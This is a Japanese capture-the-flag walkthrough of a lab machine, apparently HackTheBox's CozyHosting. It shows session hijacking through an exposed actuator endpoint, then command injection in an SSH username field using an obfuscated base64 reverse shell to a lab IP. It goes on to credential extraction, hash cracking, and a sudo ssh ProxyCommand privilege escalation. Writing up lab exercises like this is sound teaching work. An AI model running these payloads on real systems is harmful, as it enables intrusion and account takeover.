
#### nmap
![](/images/20230908201102.png)

/etc/hostsに「cozyhosting」を登録

![](/images/20230908201244.png)
webにアクセスしてみる
![](/images/20230908201411.png)

ログインページにがあるがクレデンシャルがわからない
![](/images/20230908201634.png)

dirsearchでディレクトリを検索

![](/images/20230908201749.png)

「/actuator/sessions」にアクセスするとcookieの値がでるのでウェブ開発ツールのストレージから値を変更してユーザー名とパスワードを適当に入れるとするとログインできる
![](/images/20230908202427.png)
![](/images/20230908202842.png)

「Hostname」と「Username」を適当に入れてBurpで受信してみる
![](/images/20230908203142.png)


sshの文字が見える
試しにUsernameを空で送信してみる

![](/images/20230908203424.png)

sshのエラーが帰ってきている
コマンドインジェクションの脆弱性の可能性がある

```shell
;echo $ { IFS } "[ PAYLOAD ]" | base64 $ { IFS }-d | bash;
```

「Username」に
```shell
/bin/bash -i >& /dev/tcp/10.10.14.11/9001 0>&1
```
をbase64に変換して送るとリバースシェルが獲れる
```shell
;echo$(IFS)"L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjExLzkwMDEgMD4mMQ=="|base64$(IFS)-d|bash
```

![](/images/20230908204741.png)
>IFSは空白やタブを意味する

python3でシェルを安定化する
![](/images/20230908205054.png)

ホームディレクトリに「cloudhosting-0.0.1.jar」ファイルがあるのでローカルにダウンロードする

![](/images/20230908205601.png)

「.jar」はzipと同じ圧縮形式なので「unzip」で解凍する
![](/images/20230908205727.png)

/etc/passwdから「josh」とゆうユーザーが要ることが分かる
![](/images/20230908210045.png)

解凍してできた物の中にposgresqlのクレデンシャルがある
「BOOT-INF/classes/application.properties」
![](/images/20230908210514.png)

ターゲット側でpostgresqlに接続する
**psql "postgresql:// $ DB_USER:$ DB_PWD @ $ DB_SERVER / $ DB_NAME"**

```shell
psql "postgresql://postgres:Vg&nvzAQ7XxR@localhost/postgres"
```

「\\list」ですべてのデータベースを表示
![](/images/20230908211122.png)

「\\c cozyhosting」でデータベースの切り替え
「\\d」ですべてのテーブル表示
![](/images/20230908211503.png)

SELECT文でテーブルの中を表示
![](/images/20230908211619.png)

ハッシュが取得できたのでjohnで解析
![](/images/20230908211848.png)
Username:josh
Password:manchesterunited

取得したクレデンシャルでSSH接続を実施
![](/images/20230908212105.png)

#### 特権昇格
「sudo -l」で確認すると
![](/images/20230908212245.png)

sshで特権昇格できそうなのでGTFOBINで調べる

```shell
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

![](/images/20230908212530.png)
